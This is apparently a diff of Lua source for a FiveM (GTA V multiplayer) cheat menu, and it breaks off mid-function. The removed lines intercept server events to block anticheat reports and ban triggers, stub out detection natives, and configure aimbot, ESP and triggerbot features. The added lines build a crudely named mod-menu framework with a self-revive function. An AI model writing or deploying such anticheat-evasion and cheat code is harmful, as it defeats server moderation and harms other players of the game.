@@ -1,9025 +1,9606 @@
-CreateThread(function()
+IhadSexWithMyStepMother = {}
+IhadSexWithMyStepMother.debug = true
+local menus = {}
+local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202}
+local optionCount = 0
+local currentKey = nil
+local currentMenu = nil
+local titleHeight = 0.11
+local titleXOffset = 0.5
+local titleSpacing = 2
+local titleYOffset = 0.03
+local titleScale = 1.0
+local buttonHeight = 0.038
+local buttonFont = 0
+local buttonScale = 0.365
+local buttonTextXOffset = 0.005
+local buttonTextYOffset = 0.005
+local function debugPrint(text)
+    if IhadSexWithMyStepMother.debug then
+        Citizen.Trace("[IhadSexWithMyStepMother] " .. tostring(text))
+    end
+end
 
- local rE = {}
-rE.Bypasses = {
-    Events = {
-        "anticheese",
-        "anticheat",
-        "antilynx",
-        "discordbot",
-        "EasyAdmin:CaptureScreenshot",
-        "screenshot",
-        "cheat",
-        "ncpp",
-        "ViolationDetected",
-        "godModePass",
-        "godModeFail",
-        "adminGodmodeCheck",
-        "illegalWeapon",
-        "ybn_ac",
-        "x_anticheat",
-        "CMG:ban",
-        "Choco:",
-        "alpha-tango-golf",
-        "AC_SYNC:BAN",
-        "foundyou",
-        "AntiBlips",
-        "AntiSpectate",
-        "CarlosLR-AC",
-        "globalAC:trigger",
-        "NWAC",
-        "AC:Sanction",
-        "ChXa"
-    },
-    Args = {
-        {"This player tried to bypass the anticheat", "ChocoHax"},
-        {"This player tried to stop the anticheat", "ChocoHax"},
-        {"This player injected a mod menu", "ChocoHax"},
-        {"🍫 AntiChocoStop", "ChocoHax"},
-        {"🍫 AntiTeleport", "ChocoHax"},
-        {"AntiSpectate", "ChocoHax"},
-        {"AntiBlips", "ChocoHax"},
-        {"🍫 Secly", "ChocoHax"},
-        {"ChocoHax", "ChocoHax"},
-        {"HentaiCore", "HentaiCore"},
-        {"`ForceSocialClubUpdate` Removal", "ATG"},
-        {"Ham Mafia Executor Detected", "ATG"},
-        {"Table Emptying in Resource", "ATG"},
-        {"Malicious Function Usage", "ATG"},
-        {"Player Health above MAX", "ATG"},
-        {"Weapon Damage Modified", "ATG"},
-        {"Anti-Resource-Restart", "ATG"},
-        {"Manipulation Detected", "ATG"},
-        {"Native Draw Detection", "ATG"},
-        {"Inventory Exploiting", "ATG"},
-        {"RedENGINE detection", "ATG"},
-        {"Injection detected", "ATG"},
-        {"BlacklistedWeapon:", "ATG"},
-        {"Anti-Resource-Stop", "ATG"},
-        {"Godmode Activated", "ATG"},
-        {"AntiModelChanger", "ATG"},
-        {"Infinite Health", "ATG"},
-        {"Menu Detection", "ATG"},
-        {"Cheat Engine", "ATG"},
-        {"#GetHammed", "ATG"},
-        {"Native Function", "Sanction"},
-        {"BAN", "Sanction"}
-    },
-    tfi = TriggerServerEventInternal,
-    global = _G
-}
-function rE.Bypasses:CheckEvent(event)
-    for k, v in pairs(rE.Bypasses.Events) do
-        if event:lower():find(v:lower(), 1, true) then
+    function ReviveKubca()
+        local entcord = GetEntityCoords(PlayerPedId())
+        local cords = {
+            x = math.round(entcord.x, 1),
+            y = math.round(entcord.y, 1),
+            z = math.round(entcord.z, 1)
+        }
+        respawnPed(PlayerPedId(), cords, 0)
+        StopScreenEffect("DeathFailOut")
+    end
+
+    function respawnPed(id, cords, int)
+        SetEntityCoordsNoOffset(id, cords.x, cords.y, cords.z, false, false, false, true)
+        NetworkResurrectLocalPlayer(cords.x, cords.y, cords.z, int, true, false)
+        SetPlayerInvincible(id, false)
+        TSE(false, "playerSpawned", cords.x, cords.y, cords.z)
+        ClearPedBloodDamage(id)
+    end
+
+    function TSE(is_server,event,...)
+        local args=msgpack.pack({...})
+        if is_server then
+            TriggerServerEventInternal(event,args,args:len())
+        else
+            TriggerEventInternal(event,args,args:len())
+        end
+    end
+
+    function math.round(first, second)
+        return tonumber(string.format("%." .. (second or 0) .. "f", first))
+    end
+
+local function setMenuProperty(id, property, value)
+    if id and menus[id] then
+        menus[id][property] = value
+        debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
+    end
+end
+local function isMenuVisible(id)
+    if id and menus[id] then
+        return menus[id].visible
+    else
+        return false
+    end
+end
+local function setMenuVisible(id, visible, holdCurrent)
+    if id and menus[id] then
+        setMenuProperty(id, "visible", visible)
+        if not holdCurrent and menus[id] then
+            setMenuProperty(id, "currentOption", 1)
+        end
+        if visible then
+            if id ~= currentMenu and isMenuVisible(currentMenu) then
+                setMenuVisible(currentMenu, false)
+            end
+            currentMenu = id
+        end
+    end
+end
+local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
+    SetTextColour(color.r, color.g, color.b, color.a)
+    SetTextFont(font)
+    SetTextScale(scale, scale)
+    if shadow then
+        SetTextDropShadow(2, 2, 0, 0, 0)
+    end
+    if menus[currentMenu] then
+        if center then
+            SetTextCentre(center)
+        elseif alignRight then
+            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
+            SetTextRightJustify(true)
+        end
+    end
+    BeginTextCommandDisplayText("STRING")
+    AddTextComponentSubstringPlayerName(text)
+    EndTextCommandDisplayText(x, y)
+end
+local function drawRect(x, y, width, height, color)
+    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
+end
+local function drawTitle()
+    if menus[currentMenu] then
+        local x = menus[currentMenu].x + menus[currentMenu].width / 2
+        local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset
+        local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing
+        if menus[currentMenu].titleBackgroundSprite then
+            DrawSprite(
+                menus[currentMenu].titleBackgroundSprite.dict,
+                menus[currentMenu].titleBackgroundSprite.name,
+                x,
+                y,
+                menus[currentMenu].width,
+                titleHeight,
+                0.,
+                255,
+                255,
+                255,
+                255
+            )
+        else
+            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
+        end
+        drawText(
+            menus[currentMenu].title,
+            xText,
+            y - titleHeight / 2 + titleYOffset,
+            menus[currentMenu].titleFont,
+            menus[currentMenu].titleColor,
+            titleScale,
+            true
+        )
+    end
+end
+local txtRatio = {}
+local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
+	-- calculate the height of a sprite using aspect ratio and hash it in memory
+    local ratio = GetAspectRatio(true)
+    local index = tostring(textureName)
+    local mult = 10^3
+    local floor = math.floor
+	
+	if not txtRatio[index] then
+		txtRatio[index] = {}
+		local res = GetTextureResolution(textureDict, textureName)
+		
+		txtRatio[index].ratio = (res[2] / res[1])
+		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
+		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
+	end
+	
+	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
+end
+
+local function drawSubTitle()
+	if menus[currentMenu] then
+		local x = menus[currentMenu].x + menus[currentMenu].width / 2
+		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
+        local separatorHeight = 0.0025
+        local frameWidth = 0.004
+        local menuWidth = 0.20
+        local sliderWidth = (menuWidth / 4)
+
+                local subTitleColor = {
+            r = menus[currentMenu].titleBackgroundColor.r,
+            g = menus[currentMenu].titleBackgroundColor.g,
+            b = menus[currentMenu].titleBackgroundColor.b,
+            a = 255
+        }
+        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
+
+        drawText(
+            menus[currentMenu].subTitle,
+            menus[currentMenu].x + buttonTextXOffset,
+            y - buttonHeight / 2 + buttonTextYOffset,
+            buttonFont,
+            subTitleColor,
+            buttonScale,
+            false
+        )
+		AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "meows", "woof")
+
+
+		DrawSprite("meows", "woof", x, y -0.025, menus[currentMenu].width, buttonHeight +0.05, 0, 255, 255, 255, 255)        
+
+		if optionCount > menus[currentMenu].maxOptionCount then
+			drawText(
+				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
+				menus[currentMenu].x + menus[currentMenu].width,
+				y - buttonHeight / 2 + buttonTextYOffset,
+				buttonFont,
+				subTitleColor,
+				buttonScale,
+				false,
+				false,
+				true
+			)
+		end
+	end
+end
+
+local txd = CreateRuntimeTxd('meows') 
+local duiObj = CreateDui("https://cdn.discordapp.com/attachments/940685677840961659/983811730587136010/wwba_on_top.png", 500, 240)
+local dui = GetDuiHandle(duiObj)
+local txn = CreateRuntimeTextureFromDuiHandle(txd, "wwba", dui)
+
+local function drawButton(text, subText)
+    local x = menus[currentMenu].x + menus[currentMenu].width / 2
+    local multiplier = nil
+    if
+        menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
+            optionCount <= menus[currentMenu].maxOptionCount
+     then
+        multiplier = optionCount
+    elseif
+        optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
+            optionCount <= menus[currentMenu].currentOption
+     then
+        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
+    end
+    if multiplier then
+        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
+        local backgroundColor = nil
+        local textColor = nil
+        local subTextColor = nil
+        local shadow = false
+        if menus[currentMenu].currentOption == optionCount then
+            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
+            textColor = menus[currentMenu].menuFocusTextColor
+            subTextColor = menus[currentMenu].menuFocusTextColor
+        else
+            backgroundColor = menus[currentMenu].menuBackgroundColor
+            textColor = menus[currentMenu].menuTextColor
+            subTextColor = menus[currentMenu].menuSubTextColor
+            shadow = true
+        end
+        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
+        drawText(
+            text,
+            menus[currentMenu].x + buttonTextXOffset,
+            y - (buttonHeight / 2) + buttonTextYOffset,
+            buttonFont,
+            textColor,
+            buttonScale,
+            false,
+            shadow
+        )
+        if subText then
+            drawText(
+                subText,
+                menus[currentMenu].x + buttonTextXOffset,
+                y - buttonHeight / 2 + buttonTextYOffset,
+                buttonFont,
+                subTextColor,
+                buttonScale,
+                false,
+                shadow,
+                true
+            )
+        end
+    end
+end
+function IhadSexWithMyStepMother.CreateMenu(id, title)
+    menus[id] = {}
+    menus[id].title = title
+    menus[id].subTitle = "INTERACTION MENU"
+    menus[id].visible = false
+    menus[id].previousMenu = nil
+    menus[id].aboutToBeClosed = false
+    menus[id].x = 0.0175
+    menus[id].y = 0.025
+    menus[id].width = 0.23
+    menus[id].currentOption = 1
+    menus[id].maxOptionCount = 10
+    menus[id].titleFont = 0
+    menus[id].titleColor = {r = 0, g = 0, b = 0, a = 255}
+    menus[id].titleBackgroundColor = {r = 0, g = 127, b = 23, a = 255}
+    menus[id].titleBackgroundSprite = nil
+    menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
+    menus[id].menuSubTextColor = {r = 255, g = 255, b = 255, a = 255}
+    menus[id].menuFocusTextColor = {r = 0, g = 0, b = 0, a = 255}
+    menus[id].menuFocusBackgroundColor = {r = 255, g = 255, b = 255, a = 255}
+    menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 160}
+    menus[id].subTitleBackgroundColor = {
+        r = menus[id].menuBackgroundColor.r,
+        g = menus[id].menuBackgroundColor.g,
+        b = menus[id].menuBackgroundColor.b,
+        a = 255
+    }
+    menus[id].buttonPressedSound = {name = "wwba", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
+    debugPrint(tostring(id) .. " menu created")
+end
+function IhadSexWithMyStepMother.CreateSubMenu(id, parent, subTitle)
+    if menus[parent] then
+        IhadSexWithMyStepMother.CreateMenu(id, menus[parent].title)
+        if subTitle then
+            setMenuProperty(id, "subTitle", string.upper(subTitle))
+        else
+            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
+        end
+        setMenuProperty(id, "previousMenu", parent)
+        setMenuProperty(id, "x", menus[parent].x)
+        setMenuProperty(id, "y", menus[parent].y)
+        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
+        setMenuProperty(id, "titleFont", menus[parent].titleFont)
+        setMenuProperty(id, "titleColor", menus[parent].titleColor)
+        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
+        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
+        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
+        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
+        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
+        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
+        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
+        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
+    else
+        debugPrint(
+            "Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist"
+        )
+    end
+end
+function IhadSexWithMyStepMother.CurrentMenu()
+    return currentMenu
+end
+function IhadSexWithMyStepMother.OpenMenu(id)
+    if id and menus[id] then
+        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+        setMenuVisible(id, true)
+        debugPrint(tostring(id) .. " menu opened")
+    else
+        debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
+    end
+end
+function IhadSexWithMyStepMother.IsMenuOpened(id)
+    return isMenuVisible(id)
+end
+function IhadSexWithMyStepMother.IsAnyMenuOpened()
+    for id, _ in pairs(menus) do
+        if isMenuVisible(id) then
             return true
         end
     end
     return false
 end
-function rE.Bypasses:CheckArgs(args)
-    for k, v in pairs(args) do
-        if type(v) == "string" then
-            for z, x in pairs(rE.Bypasses.Args) do
-                if x[1]:lower():find(v:lower(), 1, true) then
-                    return true
-                end
+function IhadSexWithMyStepMother.IsMenuAboutToBeClosed()
+    if menus[currentMenu] then
+        return menus[currentMenu].aboutToBeClosed
+    else
+        return false
+    end
+end
+function IhadSexWithMyStepMother.CloseMenu()
+    if menus[currentMenu] then
+        if menus[currentMenu].aboutToBeClosed then
+            menus[currentMenu].aboutToBeClosed = false
+            setMenuVisible(currentMenu, false)
+            debugPrint(tostring(currentMenu) .. " menu closed")
+            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+            optionCount = 0
+            currentMenu = nil
+            currentKey = nil
+        else
+            menus[currentMenu].aboutToBeClosed = true
+            debugPrint(tostring(currentMenu) .. " menu about to be closed")
+        end
+    end
+end
+function IhadSexWithMyStepMother.Button(text, subText)
+    local buttonText = text
+    if subText then
+        buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
+    end
+    if menus[currentMenu] then
+        optionCount = optionCount + 1
+        local isCurrent = menus[currentMenu].currentOption == optionCount
+        drawButton(text, subText)
+        if isCurrent then
+            if currentKey == keys.select then
+                PlaySoundFrontend(
+                    -1,
+                    menus[currentMenu].buttonPressedSound.name,
+                    menus[currentMenu].buttonPressedSound.set,
+                    true
+                )
+                debugPrint(buttonText .. " button pressed")
+                return true
+            elseif currentKey == keys.left or currentKey == keys.right then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
             end
         end
+        return false
+    else
+        debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")
+        return false
+    end
+end
+function IhadSexWithMyStepMother.MenuButton(text, id)
+    if menus[id] then
+        if IhadSexWithMyStepMother.Button(text .. themecolor .. "" .. themearrow) then
+            setMenuVisible(currentMenu, false)
+            setMenuVisible(id, true, true)
+            return true
+        end
+    else
+        debugPrint(
+            "Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist"
+        )
     end
     return false
 end
-function TriggerServerEventInternal(event, payload, length)
-    if rE.Bypasses:CheckEvent(event) then
-        return
+function IhadSexWithMyStepMother.CheckBox(text, checked, offtext, ontext, callback)
+    if not offtext then
+        offtext = "Off"
     end
-    local unpacked_payload = msgpack.unpack(payload)
-    if rE.Bypasses:CheckArgs(unpacked_payload) then
-        return
+    if not ontext then
+        ontext = "On"
     end
-    return Citizen.InvokeNative(0x7FDD1128, event, payload, length)
+    if IhadSexWithMyStepMother.Button(text, checked and ontext or offtext) then
+        checked = not checked
+        debugPrint(tostring(text) .. " checkbox changed to " .. tostring(checked))
+        if callback then
+            callback(checked)
+        end
+        return true
+    end
+    return false
 end
-CreateThread(
-    function()
-        for k, v in ipairs(rE.Bypasses.global) do
-            if k == "TriggerClientEventInt" or k == "HandleConfig" then
-                table.remove(rE.Bypasses.global, v)
+function IhadSexWithMyStepMother.ComboBox(text, items, currentIndex, selectedIndex, callback)
+    local itemsCount = #items
+    local selectedItem = items[currentIndex]
+    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
+    if itemsCount > 1 and isCurrent then
+        selectedItem = tostring(selectedItem)
+    end
+    if IhadSexWithMyStepMother.Button(text, selectedItem) then
+        selectedIndex = currentIndex
+        callback(currentIndex, selectedIndex)
+        return true
+    elseif isCurrent then
+        if currentKey == keys.left then
+            if currentIndex > 1 then
+                currentIndex = currentIndex - 1
+            else
+                currentIndex = itemsCount
+            end
+        elseif currentKey == keys.right then
+            if currentIndex < itemsCount then
+                currentIndex = currentIndex + 1
+            else
+                currentIndex = 1
             end
         end
-        while true do
-            _G = rE.Bypasses.global
-            Wait(0)
-        end
+    else
+        currentIndex = selectedIndex
     end
-)
-
-
-
-function IsExplosionInSphere(...)return false end;function NetworkIsInSpectatorMode()return false end;function ShutdownAndLoadMostRecentSave()return true end;function ActivateRockstarEditor()return end;function ForceSocialClubUpdate()return end;function fuckmedaddy()return end
-
-
-CreateThread(function()
-    local frozen_ents = {}
-    local frozen_players = {}
-    local friends = {}
-    local camX, camY, camZ
-    local lift_height = 0.0
-    local lift_inc = 0.1
-    local rc_camX, rc_camY, rc_camZ
-    local notifications_h = 64
-    local dict = {
-        Citizen = Citizen,
-        math = math,
-        string = string,
-        type = type,
-        tostring = tostring,
-        tonumber = tonumber,
-        json = json,
-        utf8 = utf8,
-        pairs = pairs,
-        ipairs = ipairs
-    }
-    dict.Citizen.IN = Citizen.InvokeNative
-
-    local vector_origin = vector3(0, 0, 0)
-
-    local FM = {
-        DynamicTriggers = {},
-        Painter = {},
-        Util = {},
-        Categories = {},
-        List = {},
-        PlayerCache = {},
-        Config = {
-            Vehicle = {
-                Boost = 1.0
-            },
-            Player = {
-                CrossHair = false,
-                Blips = true,
-                ESP = true,
-                ESPDistance = 1000.0,
-                Box = false,
-                Bone = false,
-                OneTap = false,
-                Aimbot = false,
-                AimbotNeedsLOS = true,
-                TriggerBotNeedsLOS = true,
-                TPAimbot = false,
-                TPAimbotThreshold = 40.0,
-                TPAimbotDistance = 2.0,
-                RageBot = false,
-                TriggerBot = false,
-                NoDrop = false,
-                AimbotFOV = 90.0,
-                AimbotBone = 1,
-                AimbotKey = "MOUSE1",
-                AimbotReleaseKey = "LEFTALT",
-                TriggerBotDistance = 500.0,
-                TargetInsideVehicles = false
-            },
-            UseBackgroundImage = true,
-            UseSounds = true,
-            UseAutoWalk = false,
-            UseAutoWalkAlt = false,
-            ShowKey = "TAB",
-            FreeCamKey = "HOME",
-            RCCamKey = "=",
-            DisableKey = "-",
-            ShowText = true,
-            SafeMode = true,
-            MenuX = 300,
-            MenuY = 300,
-            NotifX = nil,
-            NotifY = nil,
-            NotifW = 420,
-            CurrentSelection = 1,
-            SelectedCategory = "category_1",
-            UsePrintMessages = false
-        },
-        Name = "Fallout Menu",
-        Version = "1.2.2c",
-        Enabled = true,
-        Showing = false,
-        Base64 = {},
-        Tertiary = {255, 205, 0, 255},
-        MenuW = 923,
-        MenuH = 583,
-        DraggingX = nil,
-        DraggingY = nil,
-        CurrentPlayer = nil
-    }
-
-    local known_returns = {
-        ["That file doesn't exist."] = true,
-        ["Error opening file."] = true,
-        ["Tried to save but data was null."] = true,
-        ["Error deleting config. It doesn't exist."] = true,
-        ["Successfully saved config."] = true,
-        ["Successfully deleted config."] = true
-    }
-
-    local current_config = "fm_default"
-
-    local function _count(tab)
-        local c = 0
-
-        for _ in dict.pairs(tab) do
-            c = c + 1
-        end
-
-        return c
-    end
-
-    FM.Base64.CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-
-    function FM.Base64:Encode(data)
-        return (data:gsub(".", function(x)
-            local r, b = "", x:byte()
-
-            for i = 8, 1, -1 do
-                r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0')
-            end
-
-            return r
-        end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
-            if (#x < 6) then return '' end
-            local c = 0
-
-            for i = 1, 6 do
-                c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)
-            end
-
-            return self.CharList:sub(c + 1, c + 1)
-        end) .. ({'', '==', '='})[#data % 3 + 1]
-    end
-
-    function FM:SetConfigList()
-        if _Executor ~= "redENGINE" then return end
-        HandleConfig("save", "__fm_config_list.json", dict.json.encode(FM.List))
-    end
-
-    function FM:BuildIdentifier()
-        if _Executor ~= "redENGINE" then return end
-        local out = HandleConfig("load", "__fm_statistics.identifier")
-
-        if out == "That file doesn't exist." or out == "Error opening file." then
-            local identifier = FM.Base64:Encode("Name=" .. FM:GetFunction("GetPlayerName")(FM:GetFunction("PlayerId")()) .. ":Seed=" .. dict.math.random(5, 5 ^ 3) .. ":Build=" .. FM.Version)
-            HandleConfig("save", "__fm_statistics.identifier", identifier)
-            FM.Identifier = identifier
-
-            return
-        end
-
-        FM.Identifier = out
-    end
-
-    function FM:GetConfigList()
-        if _Executor ~= "redENGINE" then return {} end
-        local out = HandleConfig("load", "__fm_config_list.json")
-
-        if out == "That file doesn't exist." or out == "Error opening file." then
-            FM.List = {
-                [current_config] = 1
-            }
-
-            FM:SetConfigList()
-
-            return {}
-        end
-
-        if known_returns[out] then
-            FM:AddNotification("Failed to fetch configs. See console for details.")
-            FM:Print("[CONFIG] Failed to load config list: ^1" .. out .. "^7")
-
-            return {}
+    callback(currentIndex, selectedIndex)
+    return false
+end
+function IhadSexWithMyStepMother.Display()
+    if isMenuVisible(currentMenu) then
+        if menus[currentMenu].aboutToBeClosed then
+            IhadSexWithMyStepMother.CloseMenu()
         else
-            return dict.json.decode(out) or {}
-        end
-    end
-
-    function FM:CopyTable(tab)
-        local out = {}
-
-        for key, val in dict.pairs(tab) do
-            if dict.type(val) == "table" then
-                out[key] = FM:CopyTable(val)
-            else
-                out[key] = val
-            end
-        end
-
-        return out
-    end
-
-    function FM:IsFriend(ped)
-        local id = FM:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
-        if not id or id < 0 then return false end
-
-        return friends[FM:GetFunction("GetPlayerServerId")(id)]
-    end
-
-    FM.DefaultConfig = FM:CopyTable(FM.Config)
-    FM.List = FM:GetConfigList()
-
-    FM.ConfigClass = {
-        Load = function(cfg)
-            if _Executor ~= "redENGINE" then return FM:AddNotification("INFO", "Your build (" .. _Executor_Strings[_Executor] .. ") does not support custom configs.", 15000) end
-            local out = HandleConfig("load", (cfg or current_config) .. ".json")
-
-            if out == "That file doesn't exist." or out == "Error opening file." and (cfg or current_config) == "fm_default" then
-                FM:AddNotification("INFO", "Creating config for the first time.")
-
-                return FM.ConfigClass.Save(true)
-            end
-
-            if known_returns[out] then
-                FM:Print("[CONFIG] Failed to load ^3" .. (cfg or current_config) .. "^7: ^1" .. out .. "^7")
-
-                return FM:AddNotification("ERROR", "Failed to load config. See console for details.")
-            else
-                local _config = dict.json.decode(out)
-
-                if dict.type(_config) == "table" then
-                    FM.Config = _config
-                    FM.Config.SafeMode = true
-                    FM.ConfigClass.DoSanityCheck()
-                    FM:AddNotification("SUCCESS", "Config loaded.")
-                    FM:Print("[CONFIG] Loaded config ^3" .. (cfg or current_config) .. "^7.")
+            ClearAllHelpMessages()
+            drawTitle()
+            drawSubTitle()
+            currentKey = nil
+            if IsDisabledControlJustReleased(1, keys.down) then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+                if menus[currentMenu].currentOption < optionCount then
+                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                 else
-                    FM.ConfigClass.Save(true)
-                    FM:Print("[CONFIG] Failed to save ^3" .. (cfg or current_config) .. "^7: ^1Invalid data.^7")
-
-                    return FM:AddNotification("ERROR", "Failed to load config. See console for details.")
+                    menus[currentMenu].currentOption = 1
+                end
+            elseif IsDisabledControlJustReleased(1, keys.up) then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+                if menus[currentMenu].currentOption > 1 then
+                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
+                else
+                    menus[currentMenu].currentOption = optionCount
+                end
+            elseif IsDisabledControlJustReleased(1, keys.left) then
+                currentKey = keys.left
+            elseif IsDisabledControlJustReleased(1, keys.right) then
+                currentKey = keys.right
+            elseif IsDisabledControlJustReleased(1, keys.select) then
+                currentKey = keys.select
+            elseif IsDisabledControlJustReleased(1, keys.back) then
+                if menus[menus[currentMenu].previousMenu] then
+                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+                    setMenuVisible(menus[currentMenu].previousMenu, true)
+                else
+                    IhadSexWithMyStepMother.CloseMenu()
                 end
             end
-        end,
-        DoSanityCheck = function()
-            for key, val in pairs(FM.DefaultConfig) do
-                if FM.Config[key] == nil then
-                    FM.Config[key] = val
-                end
-
-                if type(val) == "table" then
-                    for k2, v2 in pairs(val) do
-                        if FM.Config[key][k2] == nil then
-                            FM.Config[key][k2] = v2
+            optionCount = 0
+        end
+    end
+end
+function IhadSexWithMyStepMother.SetMenuWidth(id, width)
+    setMenuProperty(id, "width", width)
+end
+function IhadSexWithMyStepMother.SetMenuX(id, x)
+    setMenuProperty(id, "x", x)
+end
+function IhadSexWithMyStepMother.SetMenuY(id, y)
+    setMenuProperty(id, "y", y)
+end
+function IhadSexWithMyStepMother.SetMenuMaxOptionCountOnScreen(id, count)
+    setMenuProperty(id, "maxOptionCount", count)
+end
+function IhadSexWithMyStepMother.SetTitle(id, title)
+    setMenuProperty(id, "title", title)
+end
+function IhadSexWithMyStepMother.SetTitleColor(id, r, g, b, a)
+    setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
+end
+function IhadSexWithMyStepMother.SetTitleBackgroundColor(id, r, g, b, a)
+    setMenuProperty(
+        id,
+        "titleBackgroundColor",
+        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
+    )
+end
+function IhadSexWithMyStepMother.SetTitleBackgroundSprite(id, textureDict, textureName)
+    RequestStreamedTextureDict(textureDict)
+    setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
+end
+function IhadSexWithMyStepMother.SetSubTitle(id, text)
+    setMenuProperty(id, "subTitle", string.upper(text))
+end
+function IhadSexWithMyStepMother.SetMenuBackgroundColor(id, r, g, b, a)
+    setMenuProperty(
+        id,
+        "menuBackgroundColor",
+        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
+    )
+end
+function IhadSexWithMyStepMother.SetMenuTextColor(id, r, g, b, a)
+    setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
+end
+function IhadSexWithMyStepMother.SetMenuSubTextColor(id, r, g, b, a)
+    setMenuProperty(
+        id,
+        "menuSubTextColor",
+        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a}
+    )
+end
+function IhadSexWithMyStepMother.SetMenuFocusColor(id, r, g, b, a)
+    setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
+end
+function IhadSexWithMyStepMother.SetMenuButtonPressedSound(id, name, set)
+    setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
+end
+Tools = {}
+local IDGenerator = {}
+function Tools.newIDGenerator()
+    local r = setmetatable({}, {__index = IDGenerator})
+    r:construct()
+    return r
+end
+function IDGenerator:construct()
+    self:clear()
+end
+function IDGenerator:clear()
+    self.max = 0
+    self.ids = {}
+end
+function IDGenerator:gen()
+    if #self.ids > 0 then
+        return table.remove(self.ids)
+    else
+        local r = self.max
+        self.max = self.max + 1
+        return r
+    end
+end
+function IDGenerator:free(id)
+    table.insert(self.ids, id)
+end
+Tunnel = {}
+local function tunnel_resolve(itable, key)
+    local mtable = getmetatable(itable)
+    local iname = mtable.name
+    local ids = mtable.tunnel_ids
+    local callbacks = mtable.tunnel_callbacks
+    local identifier = mtable.identifier
+    local fcall = function(args, callback)
+        if args == nil then
+            args = {}
+        end
+        if type(callback) == "function" then
+            local rid = ids:gen()
+            callbacks[rid] = callback
+            TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid)
+        else
+            TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1)
+        end
+    end
+    itable[key] = fcall
+    return fcall
+end
+function Tunnel.bindInterface(name, interface)
+    RegisterNetEvent(name .. ":tunnel_req")
+    AddEventHandler(
+        name .. ":tunnel_req",
+        function(member, args, identifier, rid)
+            local f = interface[member]
+            local delayed = false
+            local rets = {}
+            if type(f) == "function" then
+                TUNNEL_DELAYED = function()
+                    delayed = true
